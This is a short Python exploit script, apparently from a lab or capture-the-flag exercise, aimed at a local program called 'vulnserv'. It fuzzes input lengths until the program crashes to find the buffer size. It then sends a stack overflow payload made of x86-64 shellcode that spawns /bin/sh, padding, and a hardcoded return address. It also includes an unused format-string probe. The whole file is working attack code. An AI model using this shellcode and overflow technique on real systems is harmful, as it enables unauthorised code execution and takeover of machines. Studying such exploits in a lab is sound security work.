
import sys
from subprocess import Popen, PIPE, STDOUT
import struct


def run_process(data):
    with Popen(['./vulnserv'],stdout=PIPE, stdin=PIPE, stderr=PIPE) as p:
        pout, perr = p.communicate(input=data)
        err = perr.decode('utf-8')
        out = pout.decode('utf-8')
        return out, err, p.returncode


if __name__ == '__main__':


    shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
    start = int(sys.argv[1])

    r = 0
    while r == 0:
        data = ('A' * start + '\n').encode('utf-8')
        start += 1
        out, err, r = run_process(data)

    print(f'largo del buffer {start}')

    ex = '%p,%p,%p,%p,%p,%p,%p,%p'
    eip = 0x7ffc9d8ed480
    data = (shellcode + 'A' * (start - 1 - len(shellcode))).encode('utf-8')
    data = data + struct.pack('Q',eip)
    print(data)

    out, err, r = run_process(data)
    print(f'Entrada ({len(data)}): {data}')
    print(f'Salida: {out} {err}')

    input()